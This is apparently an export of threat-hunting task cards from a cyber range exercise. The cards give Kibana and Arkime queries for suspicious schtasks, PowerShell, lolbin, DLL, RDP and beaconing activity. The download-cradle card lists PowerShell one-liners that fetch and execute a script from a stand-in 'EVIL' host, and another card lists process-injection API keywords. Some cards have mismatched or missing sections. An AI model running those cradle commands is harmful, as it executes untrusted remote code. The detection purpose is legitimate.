tasks.task_title: HTT06.02 - HOST (Kim) Look for scheduled task creation via commandline args
tasks.task_description:
### Overview

- Look for scheduled task creation via commandline args.

### Methodology

- Leverage schtasks.exe with unusual commandline args.  
    - Set the task status to "In-Progress" 
    - Ensure your name is selected in "Assigned to" field
    - Add a tag with your LASTNAME and another tag for "HOST" to the task and then save and reopen the task. 
    - Place the following lucene query and look for unusual or suspicious commandlines/users. 

```
((event.module:sysmon AND event.code:1) OR (event.module:security AND event.code:4688)) AND process.executable:"schtasks.exe"

AND NOT process.command_line:("C:\\windows\\system32\\schtasks.exe /delete /f /TN Microsoft\\Windows\\Customer Experience Improvement Program\\Uploader" OR "C:\\windows\\system32\\schtasks.exe /run /I /TN Microsoft\\Windows\\Windows Activation Technologies\\ValidationTask")

AND NOT ((process.parent.executable:"C:\\Windows\\syswow64\\msiexec.exe" OR process.parent.command_line:("cmd.exe /C echo.| schtasks.exe /Change /TN Microsoft\\Office" AND "/TR C:\\Program Files\\Microsoft Office\\Office16\\msoia.exe"))

AND process.command_line:("/xml C:\\Program Files\\Microsoft Office\\Office16\\1033" OR "TR C:\\Program Files\\Microsoft Office\\Office16\\msoia.exe scan upload" OR "ru SYSTEM /xml C:\\Program Files (x86)\\Common Files\\MicrosoftShared\\OFFICE16\\HeartbeatConfig.xml"))
```

This query uses the following fields:
- process.executable
- process.parent.executable
- event.module
- event.code
- process.command_line
- process.parent.command_line

Verify the mapping schema of these fields and adjust, example:
- keyword = `process.executable`
- text = `process.executable.text`


Potential Hardening Recommendations:
- Restrict scheduled task creation to designated users (role-based permissions)
- Monitor for anomalous scheduled task creation via dashboard visualization (Kibana, Security Onion...etc)
- Restrict process execution locations (block execution from 'temp' folders) 



(Place any improvements or updated instructions/tips/strategies for completing this task in the future into the OVERVIEW section - above this line BEFORE the Event Collected section. All other changes will be sanitized and lost when this task is re-imported.)

### Event Collected/Used: 

winlogbeat

### Query/Actions:

```
first query - event.code:(1 OR 4688) AND process.executable.text:"schtasks.exe" AND NOT agent.hostname:("knights-fs" OR "knights-dc" OR "knt-win10-1-2" OR "knights-ex" OR "KNT-WIN7-1-3")

second query - event.code:(1 OR 4688) AND process.command_line:/.*[Ss][Cc][Hh][Tt][Aa][Ss][Kk][Ss].*/ AND NOT agent.hostname:(/knight.*/ OR /[Kk][Nn][Tt]-.*/)
```


### Result Link:

[first query](https://kibana.lan/goto/b02d6800-7219-11f0-9e5a-85ef666a4f46)
[second query](https://kibana.lan/goto/c0733550-7219-11f0-9e5a-85ef666a4f46)

### Justification:

Both queries show legitimate windows activites (Rangers Network). The Windows Customer Experience Improvement Program from schtasks.exe is normal process.

tasks.task_title: HTT05.10 - HOST (TBD) Hunt for unusual child process of powershell
tasks.task_description:
### Overview



### Methodology

Open one Kibana Discovery Tab, and another tab to build the visualization. 
Start with a base query   
- `process.parent.name: ("powershell.exe" OR  "pwsh.exe") ` 
- Start with a time range of last year, and adjust as needed. If there is a lot of data, a year will be too much.   
- Build a visualization for process name by:  
    - Visualization Library -> Create Visualization -> Aggregation Based -> Data Table 
    - Base the visualization on index pattern `winlogbeat-*`     
    - Leave the metric `count` and add an additional metric `unique count` on field `agent.name`     
    - Add bucket split rows     
    - Aggregation by term     
    - Field `process.name.keyword`     
    - Order by `Metric: Count`     
    - Order Descending     
    - Size 100  
    - Save the visualization  
- Build a visualization for process commandline argument by:  
    - Visualization Library -> Create Visualization -> Aggregation Based -> Data Table 
    - Base the visualization on index pattern `winlogbeat-*`     
    - Leave the metric `count` and add an additional metric `unique count` on field `agent.name`     
    - Add bucket split rows     
    - Aggregation by term     
    - Field `process.commandline.keyword`     
    - Order by `Metric: Count`     
    - Order Descending     
    - Size 100  
    - Save the visualization  
- In the Discover Tab, filter by the same base query     
    - `process.parent.name: ("powershell.exe" OR  "pwsh.exe") ` 
    - Add the following fields in this order     
        - `agent.hostname`, `related.user`, `process.parent.command_line`, `process.command_line`, `process.working_directory`  
    - Begin looking for high prevalence commandline arguments or process names that can be filtered out 
    - Look for a service with a high occurance count and on a lot of unique systems 
    - In the discovery tab, filter for the process name or commandline and investigate to see if it looks normal and can be filtered out.   For example, in once month of data for a scenario there were 81,542 records (out of 246,945 records with PowerShell as the parent process) for a commandline argument with HOSTNAME.EXE. When that filter was added to the Discorvery tab, it was obvious that was run from a lot of user accounts, on a lot of systems and was normal traffic.   
    - `process.parent.name: ("powershell.exe" OR  "pwsh.exe") AND process.command_line: "HOSTNAME.EXE"` 
        - This can be filtered out with the following filter     
        - `process.parent.name: ("powershell.exe" OR  "pwsh.exe") AND NOT (process.command_line: "HOSTNAME.EXE")`  
    - Another example is `process.command_line.keyword: "C:\Windows\system32\chcp.com" 65001` was in 1959 records 
    - You can investigate is in the discovery tab with this filter     
        - `process.parent.name: ("powershell.exe" OR  "pwsh.exe") AND process.command_line.keyword: "\"C:\\Windows\\system32\\chcp.com\" 65001"` 
    - If you determine it's not malicious, you can add it to the previous filter with this query:      
        - `process.parent.name: ("powershell.exe" OR  "pwsh.exe") AND NOT (process.command_line: "HOSTNAME.EXE" OR process.command_line.keyword: "\"C:\\Windows\\system32\\chcp.com\" 65001")`     
    - Note that extra backslashes were needed to escape quotation marks and backslashes in the path  


Potential Hardening Recommendations:
- Use Constrained-Language Mode (CLM) to Restrict PowerShell usage to administrators.

tasks.task_title: HTT11.03 - NET (TBD) Aggregate on a single source host communicating with multiple target systems inside of the DAL
tasks.task_description:
### Overview

This is looking for a single workstation or server connecting to lots of other workstations.  

### Methodology

Verify variable DAL, DAL_svr, DAL_wks, routers, Broadcast are set.  To set variables go to Setting at top of ARKIME, then Click SHORTCUT on left.  Fill in fields NAME, VALUE, select IP(s) for TYPE dropdown, and click box for SHARED. 

```
ip.src == $DAL && ip.dst == $DAL_wks && ip != $Broadcast && ip != $routers && tcpflags.syn >= 1  
```
Query looks for connections started from within the DAL to wks and excludes routers and Broadcasts.

tasks.task_title: HTT04.05 - NET (TBD) strange inbound connections from external (RDP)
tasks.task_description:
### Overview:

Check to see if any src ips are external connecting to internal dst ips on port 3389.

Two seperate instances from the same ip.src to the same internal ip.dst; First instances lasted about less than a minute and the second batch lasted over an hour.


### Methodology:

Use either arkime or kibana [filebeats]
For arkime:
    query: <ip.src != KT-C (*or other non-external ips*) ip.dst == $TX_NET && port.dst == 3389>  ( TX_NET is a veriable in arkime that should be set up in CTT01.19)
    example: (ip.src != $TX_NET && ip.src != $CPT_NET && ip.src != $MP_NET && ip.src != $RAL_NET && ip.dst == $TX_NET && port.dst == 3389)
    
For kibana:
    query: event.code:3 AND destination.port:3389 AND source.ip: <NOT Dal>

tasks.task_title: HTT13.09 - HOST (TBD) Look for indicators of a powershell download-cradle
tasks.task_description:
### Overview



### Methodology

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

Strings to look for in powershell scriptblock logs:

"New-Object Net.WebClient"
"system.net.webclient"
"Net.HttpWebRequest"
"InternetExplorer.Application"
"MSXML2.ServerXmlHTTP"
"DownloadString"
"DownloadFile"
"DownloadData"
"outfile"
"http"
"https"
"Invoke-webrequest"
"IWR"

IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

IEX (iwr 'http://EVIL/evil.ps1')

$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

tasks.task_title: HTT05.01 - HOST (TBD) Hunt for common malicious powershell indicators
tasks.task_description:
### Overview

https://github.com/PowerShell/PowerShell/blob/7dc4587014bfa22919c933607bf564f0ba53db2e/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1831-L1968

Find all events where powershell was used in a nonstandard way. Look for the keywords like "sysnative" or or "invoke-expression" "iex" or "FromBase64String" OR "ToBase64String" OR "-bxor" OR "MemoryStream" OR "InteropServices" OR "deflatestream" OR "ExpandString" OR "Add-Type" OR "DllImport" OR "OpenProcess" OR "VirtualAlloc" OR "WriteProcessMemory" OR "CreateUserThread" OR "GetDelegateForFunctionPointer" OR "CreateThread" OR "CreateRemoteThread" OR "memcpy" OR "LoadLibrary" OR "GetProcAddress" OR "PtrToString" OR "ImpersonateLoggedOnUser" OR "GetProcessHandle"

Look for suspicious invocations in process-creation event commandlines like "WindowStyle Hidden" OR "ExecutionPolicy Bypass" OR "Exec Byp" OR "NonI" OR "NoP" OR "enc" OR "-C

https://redcanary.com/threat-detection-report/techniques/powershell/


### Methodology

(sysmon EID:1 or security EID:4688) and/or in powershell scriptblock events (4104)  

```event.module:sysmon AND process.command_line:"sysnative" AND process.executable:powershell*``` 

```event.module:sysmon AND process.executable:(PowerShell* OR "cmd.exe") AND user.name:SYSTEM```

tasks.task_title: HTT09.02 - HOST (TBD) Hunt for new credential login type 9 (psexec use)
tasks.task_description:
### Overview

A logon type-9 is a netonly authentication with explicit credentials. This is a common artifact generated when attackers leverage pass-the-hash. But this can also be triggered by administrators leveraging the runas.exe binary and specifying the /netonly cred. The query below looks for the logon type 9 base condition excluding when the machine account logs on as SYSTEM for exchange servers and when a rangetech is the subject & target user with powershell. All other hits may be suspicious and will require investigation  

### Methodology

```
event.module:security AND event.code:4624 AND winlog.event_data.LogonType:9 AND NOT (winlog.event_data.LogonProcessName:Advapi* AND winlog.event_data.SubjectUserName:/.*\$/ AND winlog.event_data.TargetUserName:SYSTEM AND process.executable:("C:\\Program Files\\Microsoft\\Exchange Server")) AND NOT (winlog.event_data.LogonProcessName:Advapi* AND winlog.event_data.SubjectUserName:"rangetech" AND winlog.event_data.TargetUserName:"rangetech" AND process.executable:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") 
```

tasks.task_title: HTT05.11 - HOST (TBD) Hunt for execution using common lolbins by looking for "shell" child processes of lolbins
tasks.task_description:
### Overview

Search for execution using common lolbins by looking for "shell" child processes of lolbins. Filter known good from results.

### Methodology

Use the following lucene query to begin: 
``` 
event.code: 1 AND process.executable:(cmd.exe OR powershell.exe OR pwsh.exe) AND NOT process.parent.executable:("C:\\Windows\\explorer.exe" OR "C:\\Windows\\System32\\sihost.exe")   
AND NOT (process.parent.executable:("C:\\Windows\\system32\\svchost.exe" OR "C:\\Windows\\system32\\taskeng.exe") AND process.command_line:("cmd.exe /c C:\\Program Files (x86)\\Simspace" OR "cmd.exe /c c:\\ue_temp_hang_fix.bat")) 
AND NOT (process.parent.executable:("C:\\Program Files\\Puppet Labs\\Puppet" OR "C:\\Program Files (x86)\\Simspace" OR "C:\\Windows\\System32\\CompatTelRunner.exe")) 
AND NOT (process.parent.command_line:("C:\\Windows\\system32\\conhost.exe --headless --width" AND height AND signal) AND process.command_line.keyword:("c:\\windows\\system32\\cmd.exe")) 
AND NOT (process.parent.command_line:("cmd /C start ue-" OR "AppData\\Local\\Temp\\ue" OR "cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure" OR "cmd.exe /c C:\\Program Files (x86)\\Simspace\\UE") AND process.command_line:("AppData\\Local\\Temp\\ue" OR "powershell  -ExecutionPolicy Unrestricted -File C:\\Program Files (x86)\\Simspace\\UE" OR "cmd.exe /c C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64" OR "cmd.exe /c cscript /nologo C:\\Program Files (x86)\\Simspace\\UE" OR "cmd.exe  /S /D /c ECHO")) 
AND NOT (process.parent.executable.keyword:"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" AND process.command_line:"cmd.exe /c C:\\Program Files\\VMware\\VMware Tools") 
AND NOT (process.parent.command_line:(UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBv* OR JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAA* OR YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAgAD0AIAAn*) OR process.command_line:(UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBv* OR YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAgAD0AIAAn*))  
AND NOT process.args:(ue OR UE) 
AND NOT process.parent.executable: (Puppet OR puppet) 
AND NOT process.parent.args:Simspace
AND NOT related.user:rangetech 
```

tasks.task_title: HTT11.09 - HOST (TBD) Look for lateral movement via unusual child processes (or filewrites or dnslookups or process-injections) of common remote-tools (wmiprvse.exe, wsmprovhost.exe, winrshost.exe)
tasks.task_description:
### Overview

Use endpoint logs to look for anomalous behaviors related to common windows lateral-movement tools  

### Methodology

- Set the task status to "In-Progress" 
- Ensure your name is selected in the "Assigned to" field  
- Add a tag with your LASTNAME and another tag for "HOST" to the task and then save and reopen the task. 
- Place the following lucene query into the query-bar and look for unusual or suspicious commandlines/users.  

``` 
((event.module:sysmon AND event.code:1) OR (event.module:security AND event.code:4688)) AND process.parent.executable:("wsmprovhost.exe" OR "wmiprvse.exe" OR "winrshost.exe" OR "mstsc.exe") AND host.ip:("" OR "" OR "" OR ... OR "")  

AND NOT (related.user:(Administrator OR rangetech OR administrator) AND process.parent.command_line:"WinRsHost.exe -embedding" AND process.executable:"cmd.exe" AND process.command_line:"C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand")  

AND NOT process.executable:("C:\\Windows\\System32\\repadmin.exe" OR "C:\\Windows\\System32\\conhost.exe" OR "C:\\Windows\\System32\\WerFault.exe" OR "C:\\Windows\\System32\\wermgr.exe")  

AND NOT (agent.name:"" AND related.user:SYSTEM AND process.parent.executable:"wmiprvse.exe" AND process.executable:("C:\\Windows\\Temp" AND DismHost.exe)) 
```     


``` event.module:sysmon AND event.code:1 AND process.parent.executable:("wsmprovhost.exe" OR "wmiprvse.exe" OR "winrshost.exe" OR "mstsc.exe") AND host.ip:("28.158.223.0/24" OR "28.158.100.0/24" OR "24.205.99.0/24" OR "24.205.133.0/24" OR "85.112.166.0/24" OR "85.112.13.0/24" OR "157.238.50.0/24" OR "157.238.6.0/24" OR "28.158.10.0/24" OR "24.205.0.248/28" OR "85.112.1.248/28" OR "85.112.34.0/24" OR "85.112.13.0/24" OR "157.238.0.254/24" OR "157.238.10.0/24")  AND NOT (related.user:(Administrator OR rangetech OR administrator) AND process.parent.command_line:"WinRsHost.exe -embedding" AND process.executable:"cmd.exe" AND process.command_line:"C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand") AND NOT process.executable:("C:\\Windows\\System32\\repadmin.exe" OR "C:\\Windows\\System32\\conhost.exe" OR "C:\\Windows\\System32\\WerFault.exe" OR "C:\\Windows\\System32\\wermgr.exe") AND NOT (agent.name:"afb-ex" AND related.user:SYSTEM AND process.parent.executable:"wmiprvse.exe" AND process.executable:("C:\\Windows\\Temp" AND DismHost.exe)) 
```

tasks.task_title: HTT05.03 - HOST (TBD) Hunt for suspicious child processes of shell binaries
tasks.task_description:
### Overview

We suspect that the threat actor may be running processes directly from a shell executable like cmd, powershell, or bash. If so, the malicious process will have a parent process matching one of these binaries.


### Methodology

```
process.parent.executable:(cmd.exe OR powershell.exe OR pwsh.exe OR bash.exe) AND NOT process.executable:("puppet" OR "simspace" OR "cscript") 
AND NOT process.parent.command_line:("cmd.exe /c C:\\Program Files (x86)\\Simspace\\UE" OR "powershell.exe -NoProfile -NonInteractive -NoLogo -ExecutionPolicy Bypass -File C:\\ProgramData\\PuppetLabs\\puppet" OR "cscript.exe /nologo C:\\windows\\Temp\\puppet" OR "cscript.exe %windir%\\system32\\slmgr.vbs /dlv | find " OR "cmd.exe /c C:\\ProgramData\\chocolatey\\bin\\choco.exe -v" OR "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate " OR "cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure" OR "cmd.exe /c c:\\ue_temp_hang_fix.bat")

tasks.task_title: HTT05.05 - HOST (TBD) Hunt for process execution from TEMP folders
tasks.task_description:
### Overview

Look for execution from any Temp folder

### Methodology

```host.ip:("172.16.1.0/24" OR "172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24") AND process.executable.text:"Temp" AND NOT process.executable:"C:\\Users"```

Potential Hardening Recommendations:
- In linux adminstrators are able to block execution from /tmp by mounting the folder with a 'noexec' tag. If windows had the same ability I would recommend hardening the C:\Windows\Temp directory to prevent files from executing; however, there may be files that require execution from that folder. (Most software installs and windows-updates execute from C:\Windows\Temp)
- Use Group Policy or Defender Attack Surface Reduction rules to restrict execution from Temp folders to administrators.

tasks.task_title: HTT05.16 - NET (TBD) Look for malicious executable signature matches in Suricata alerts
tasks.task_description:
### Overview

Use Suricata rules to identify potential indicators of malicious code transiting the network.

### Methodology

1. Open kibana and select the filebeat-* feed  
2. Lucene query: 
    - suricata.eve.alert.category: "Executable code was detected"
3. Inspect the source and destination IPs for anomalous indicators
    - source.ip and destination.ip addresses for prevalence (small or large number of DAL assets communicating with external host)
    - large volume of connections to an external IP from a single host
    - GeoLocation of the external host
    - Domain name or TLD of the external host
    - Look at PCAP if available to try and reconstruct any captured binaries

tasks.task_description:
### Overview



### Methodology

EventID: 129 - Created Task Process Path|contains: 'C:\Windows\Temp\' OR '\AppData\Local\Temp\' OR '\Desktop\' OR '\Downloads\' OR '\Users\Public\' OR 'C:\Temp\' 

```
host.ip:("172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24" OR "172.16.1.0/24" OR "172.16.0.0/24") AND event.code:129
```

**For each query below, if no results are found remove the .text from each field in the query.**
```
host.ip:("172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24" OR "172.16.1.0/24" OR "172.16.0.0/24") AND event.module:sysmon AND event.code:1 AND process.parent.executable.text:"svchost.exe" AND process.parent.command_line.text:"schedule" AND (process.working_directory.text:("users" OR "temp") OR process.command_line.text:("users" OR "temp"))

AND NOT (related.user:SYSTEM AND process.executable.text:cmd.exe AND process.command_line.text:("Simspace" OR "c:\\ue_temp_hang_fix.bat"))
AND NOT (related.user:SYSTEM AND process.executable.text:(taskhostw.exe OR dstokenclean.exe))
```

```
event.dataset:zeek.dns AND dns.answers.data:"104.124.102.29"
```

Another approach
```
host.ip:("172.16.2.0/24" OR "172.16.90.0/24" OR "172.16.91.0/24" OR "172.16.1.0/24" OR "172.16.0.0/24") AND event.module:sysmon AND event.code:1 AND process.parent.executable.text:"svchost.exe" AND process.parent.command_line.text:"schedule" 

AND NOT (related.user:SYSTEM AND process.executable.text:cmd.exe AND process.command_line.text:("Simspace" OR "c:\\ue_temp_hang_fix.bat"))
AND NOT (related.user:SYSTEM AND process.executable.text:(taskhostw.exe OR dstokenclean.exe))
AND NOT process.working_directory:"C:\\Windows\\system32\\"
```

tasks.task_title: HTT10.02 - NET (TBD) Visualization for internal port scanning to internal assets aggregated on single host with high count of unique destination ports
tasks.task_description:
### Overview

Visualization for internal port scanning to internal assets aggregated on single host with high count of unique destination ports. This is designed to look for scanning type activity within the DAL.

### Methodology

Create kibana visualization of count of unique destination ports by source IP.
- Visualize Library > Create Visualization >> Aggregation Based >> Data table
- Select **filebeat index**
- Metrics > Aggregation > Unique Count
- Metrics > Field > **destination.port**
- Buckets > Add > Split Rows     
- Aggregation > Term     
- Field > **source.ip** 
- Order >** Descending**     
- Size > **10** - Buckets > Add > Split Rows     
- Aggregation > Term      
- Field > **destination.ip**     
- Order > **Descending**     
- Size > **10**

Once the visualization comes up sort/order the count of unique port descending. Any high unique number of ports (ex. thousands)  Add query  ```event.dataset:zeek.connection AND event.type:start AND source.ip:("DAL IP RANGE 1" OR "DAL IP RANGE 2" OR ...) AND NOT source.ip:("DC IP 1" OR "DC IP 2" OR ...) AND destination.ip:("DAL IP RANGE 1" OR "DAL IP RANGE 2" OR ...)```  NOTE: **event.type** *start* is translated from the zeek.connection.state field which is a summarized state for each connection. Any **S** in the connection state translates to the attempted start of a connection.

Potential Hardening Recommendations:
- Block port scanning utilities on mission partner assets (white-listing applications, end-point security policies on endpoints.)
- Implement firewall solution between server and user subnets, establish baseline rules to limit/restrict necessary ports/protocols for mission partner execution between subnet enclaves (ex: block traffic between user-1 enclave and user-2 enclave, no operational requirement for workstation-to-workstation comms.)
- Implement NIDS to detect, report, and block observed port scanning attempts within internal domain.

tasks.task_title: HTT15.03 - HOST (TBD) Look for hosts with vulnerable versions of SonicWall Global VPN installed
tasks.task_description:
### Overview

SonicWall has confirmed that Global VPN Client (GVC) installer 4.10.7.1117 (32-bit and 64-bit) and earlier versions have three specific vulnerabilities in one of the installer components as outlined below:

1. Global VPN Client DLL Search Order Hijacking via Application Installer (RunMSI.exe). This includes both the 32-Bit as well as 64-bit installers.

2. Global VPN Client Installer being unable to remove RarSFX folder and its content after installation. Therefore, all organizations and/or users who have installed the latest GVC version have the problematic RarSFX folder and its vulnerable component (RunMSI.exe), which could lead to potential exploitation of the first vulnerability above. Only the last three 64-bit versions 4.10.7.1117, 4.10.6.0913 and 4.10.5.1224 are impacted.

3. 32-Bit Global VPN Client DLL Highjacking over Microsoft Foundation Class DLLs. While first two vulnerabilities apply to the installer, this one is in the application itself. Only the 32-bit version of GVC is vulnerable. 

Successful exploitation via a privileged user could result in command execution in the target system. All vulnerable DLL components are located in the RunMSI.exe part of the installer. A vulnerable installer component (RunMSI.exe) is vulnerable to a total of 15 variations of the DLL Search Order Hijacking.

These vulnerabilities require user interaction and running of the vulnerable installer. Command execution in the target system needs to be executed with administrator privileges. The GVC installer doesn't remove problematic RarSFX folder and its content after installation. 

### Methodology


1. After reading background, I went to search for the three KNOWN versions of the software that contain the vuln: 4.10.7.1117, 4.10.6.0913 and 4.10.5.1224 the assumption is that if one of these fit a generic search I can then focus on those potential findings
- 4.10.7.1117 resulted in 0 findings
- 4.10.6.0913 resulted in 0 findings
- 4.10.5.1224 resulted in 77 findings (SUS)
2. Notified CCL and awaiting direction
3.

- [ ] N/A - Disposition does not apply to Characterization Tasks  SUSPICIOUS

### Justification:
On rng-win10-1-1 the process "init.exe" is seen beaconing to 200.200.200.180|80 52,000 times from two destination in keri.kline user directory.
All activity observed occurs in a 1 hour timespan. The activity ends when the process is terminates. No further beaconing is seen from this host.
As a group we concluded this activity is malicious, as it is part of a larger picture of malicious activity involving user keri.kline and the host rng-win10-1-1.

### Enable hardening recommendation:
Prevent execution of executables downloaded from the internet (zone 3 identifier).
Restrict attachment-types (use allowlist that doesnt include zip) 
Implement a Web Application Firewall in front of webservers 
Application Allowlisting 
Implement web proxy, only allow browsing to categorized sites with specific categories. Restrict file-downloads at proxy. 





### Successes:
This task is excellent at finding malicious activity. There was not much noise after filtering out onedrive and dismhost.


### Challenges/Opportunities to improve:
There were so many windows events to add to the timeline from this task. Additionally we suspected the linux hosts may be compromised. Due to the amount of timeline events I added I was stuck on this task while many others had already moved on to Triage.

tasks.task_title: HTT12.02 - NET (Honie) Hunt for unique/anomalous http user agent

### Overview

Look for outbound unique or anomalous http user agent strings.

### Methodology

** Arkime **
dstOutsideCountry!US && bytes > 1000000

Filter Traffic: Use Arkime's filtering capabilities to search for large data transfers. You can filter by IP addresses, ports, protocols, and byte size.

Analyze Traffic: Look for unusual patterns, such as large amounts of data being sent to unfamiliar external IP addresses.

Visualize Data: Use Arkime's visualization tools to identify and investigate suspicious traffic flows.

** Elastic **
Example Query for Elastic (Kibana)
destination.geo.country_iso_code != "US" and network.bytes > 1000000

tasks.task_title: HTT13.01 - NET (TBD) Hunt for anomalous connections externally (by internal IP and connection count, beaconing)
tasks.task_description:
### Overview

Hunt for anomalous connections externally (by internal IP and connection count, beaconing) 

### Methodology

**OPTION 1: CREATE KIBANA VISUALIZATION OF CONNECTION COUNT BY PORT TO EXTERNAL IP.**  
- Visualize Library > Create Visualization >> Aggregation Based >> Data table 
- Select **filebeat index** 
- Metrics > Aggregation > Count 
- Metrics > Field > **destination.port** 
- Buckets > Add > Split Rows     
- Aggregation > Term
- Field > **source.ip**
- Order >** Descending**
- Size > **10**
- Buckets > Add > Split Rows
- Aggregation > Term
- Field > **destination.ip**
- Order > **Descending**
- Size > **10**
- Buckets > Add > Split Rows
- Aggregation > Term
- Field > **destination.port**
- Order > **Descending**
- Size > **10**
-Add query:  ```event.dataset:zeek.connection AND event.type:start AND source.ip:("DAL IP RANGE 1" OR "DAL IP RANGE 2" OR ...) AND NOT destination.ip:("DAL IP RANGE 1" OR "DAL IP RANGE 2" OR ...)```   

**OPTION 2: CREATE ARKIME QUERY OF INTERNAL TO EXTERNAL IP BEHAVIOR.**  
- Arkime > SPI View
- Add query:  ```ip.src == [DAL IP RANGE 1,DAL IP RANGE 2,...] && ip.dst != [DAL IP RANGE 1, DAL IP RANGE 2,...]```    

Potential Hardening Recommendations:
- Develop detections for consistent number of bytes going outbound over a certain period of time based on Zeek connection logs. This might need to be a scripted detection.

tasks.task_title: HTT05.07 - HOST (TBD) Look for Execution of malicious DLLs in user-writable locations
tasks.task_description:
### Overview

Look for Execution of malicious DLLs in user-writable locations. Use lolbins like rundll32.exe or regsvr32.exe or dllhost.exe with C:\Users or "Temp" in the Command_line or in the working_directory  
Use endpoint logs to look for anomalous behaviors related to common windows lateral-movement tools.  
 

### Methodology


#### 1. Setup the Task in IRIS
- Set the task status to "In-Progress" 
- Ensure your name is selected in the "Assigned to" field  
- Add a tag with your LASTNAME and another tag for "HOST" to the task and then save and reopen the task. 
- Place the following lucene queries into the query-bar and look for unusual or suspicious commandlines/users.
    


#### 2. Lolbins commonly associated with DLL loading/execution detonating from a User-profile or Temp location 
`process.executable:("rundll32.exe" OR "regsvr32.exe" OR "dllhost.exe") AND (process.command_line:("C:\\Users" OR "Temp") OR process.working_directory:("C:\\Users" OR "Temp")) AND NOT process.command_line:("C:\\Windows\\system32\\rundll32.exe" OR "C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess")`

**Query Breakdown**

- Filter for the following processes to be executed
    - `process.executable:("rundll32.exe" OR "regsvr32.exe" OR "dllhost.exe")`
- Find events where the process command line contains either a user's profile path or the "Temp" string, often used to detect suspicious or malicious activity
    - `(process.command_line:("C:\\Users" OR "Temp")` 
- Identify processes whose working directory is within a user's profile or contains "Temp", which can indicate suspisious behavior
    - `process.working_directory:("C:\\Users" OR "Temp")`
- Exclude events where the process commandline contains either `rundll32.exe` from system32 or `inetcl.cpl`for internet options, or `ClearMyTracksByProcess` for history clearing, which all helps focus on other potentially suspicious processes.
    - `NOT process.command_line:("C:\\Windows\\system32\\rundll32.exe" OR "C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess")`
    

#### 3. Search for Sysmon ImageLoad events **(not currently enabled in our sysmon config)** 
`event.code:7 AND event.module:sysmon`

#### 4. Identify Newly Created Executables and DLLs in Unusual Locations (Excluding Common Software and System Processes)
```event.code:(11 OR 15) AND file.extension:(exe OR dll)   AND NOT process.executable:("C:\\Program Files (x86)\\Simspace" OR "C:\\Windows\\Microsoft.NET\\Framework64" OR "C:\\Windows\\Microsoft.NET\\Framework" OR "C:\\Windows\\system32\\cleanmgr.exe" OR "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" OR "C:\\Windows\\system32\\taskhostw.exe" OR "C:\\windows\\system32\\taskhost.exe" OR "C:\\windows\\System32\\sdiagnhost.exe" OR "C:\\Program Files\\Malwarebytes" OR "C:\\Program Files\\Windows Defender\\MsMpEng.exe" OR "C:\\Windows\\SysWOW64\\OneDriveSetup.exe" OR "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin")   AND NOT (process.executable:("powershell.exe" OR "c:\\windows\\system32\\inetsrv\\w3wp.exe") AND file.name:/[a-z0-9]{8}\.dll/)   AND NOT file.path:("C:\\Program Files\\winlogbeat" OR "C:\\PROGRA~1\\WINLOG~" OR "C:\\Windows\\Microsoft.NET\\Framework64" OR "C:\\Program Files (x86)\\Microsoft Office" OR "C:\\Program Files (x86)\\Common Files\\" OR "C:\\Program Files\\Common Files" OR "C:\\Program Files (x86)\\Microsoft" OR "C:\\Program Files (x86)\\Microsoft SQL Server" OR "C:\\Program Files\\Microsoft Office" OR "C:\\Program Files (x86)\\Microsoft.NET" OR "C:\\Users\\rangetech\\AppData\\Roaming\\Microsoft\\Installer" OR "C:\\Setup\\7z2301-x64.exe")   AND NOT (file.directory:"C:\\Windows\\Temp" AND file.name:/[a-z0-9]{8}\.dll/) AND NOT (file.path:"C:\\Windows\\System32\\spool\\drivers" AND process.executable:"C:\\Windows\\System32\\spoolsv.exe") AND NOT (file.path:"C:\\Windows\\Temp" AND process.executable:"C:\\Windows\\system32\\wbem\\wmiprvse.exe") AND NOT (file.path:"AppData\\Local\\Microsoft\\WindowsApps" AND process.executable:"C:\\Windows\\system32\\svchost.exe") AND NOT (file.path:("C:\\Program Files" OR "C:\\Windows\\SysWOW64") AND process.executable:("C:\\Setup\\7z2301-x64.exe" OR "C:\\Windows\\system32\\msiexec.exe"))```

**Query Breakdown**

- Show events where new files with `.exe` or `.dll` extension are created, typically indicating software installation or execution.
    - `event.code:(11 OR 15) AND file.extension:(exe OR dll)`
- Exclude processes running from known , trusted locations like standard application installation directories to filter out legitimate software actifity
